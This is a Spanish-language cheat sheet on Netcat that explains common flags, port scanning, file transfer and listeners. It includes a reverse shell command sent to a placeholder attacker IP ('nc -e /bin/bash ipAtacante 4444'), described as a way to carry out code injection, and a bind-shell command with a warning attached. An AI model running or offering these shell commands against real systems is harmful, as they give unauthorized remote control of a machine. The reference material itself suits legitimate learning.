

---

Netcat (nc) es una herramienta de red ligera y versátil que permite leer y escribir datos a través de conexiones TCP o UDP. Se usa para depuración, transferencia de archivos, creación de listeners (escuchas), tunneling simple, banner grabbing y escaneo de puertos. Es muy potente (y también puede usarse con fines maliciosos), por lo que debe emplearse con responsabilidad y permisos adecuados.

- Comando mas usado :

```bash
nc -nlvp 4444
```


- Enviar una reverse shell a tu IP atacante para ejecutar la inyección de código, como en el siguiente ejemplo:

```bash
nc -e /bin/bash ipAtacante 4444
```


---

Otros Comandos/flags más usados (con ejemplos):

- `nc <host> <port>` — Conectar a un servicio TCP.  
    Ejemplo: `nc ejemplo.com 80`
    
- `nc -l -p <port>` — Abrir un puerto en modo escucha (server).  
    Ejemplo: `nc -l -p 1234`
    
- `nc -l -p <port> -k` — Escuchar y aceptar múltiples conexiones (mantener abierto).  
    Ejemplo: `nc -l -p 1234 -k`
    
- `nc -u <host> <port>` — Usar UDP en lugar de TCP.  
    Ejemplo: `nc -u 192.168.1.5 53`
    
- `nc -v` / `-vv` — Modo verbose (más información).  
    Ejemplo: `nc -v ejemplo.com 22`
    
- `nc -n` — No resolver DNS (usar direcciones numéricas).  
    Ejemplo: `nc -n 10.0.0.1 22`
    
- `nc -z -v <host> <ports>` — Escaneo rápido de puertos (modo “zero-I/O”).  
    Ejemplo: `nc -z -v 10.0.0.1 20-80`
    
- `nc -w <seconds>` — Timeout para conexiones o lectura.  
    Ejemplo: `nc -w 3 ejemplo.com 80`
    
- Transferir archivos (sender/receiver):  
    Receptor: `nc -l -p 1234 > archivo_recibido`  
    Emisor: `nc <ip_receptor> 1234 < archivo_a_enviar`
    
- Ejecutar un shell remoto (opción peligrosa y a menudo deshabilitada): `nc -l -p 4444 -e /bin/bash` — **Advertencia:** esto abre un shell remoto sin autenticación; puede comprometer el equipo y muchas distros deshabilitan `-e`.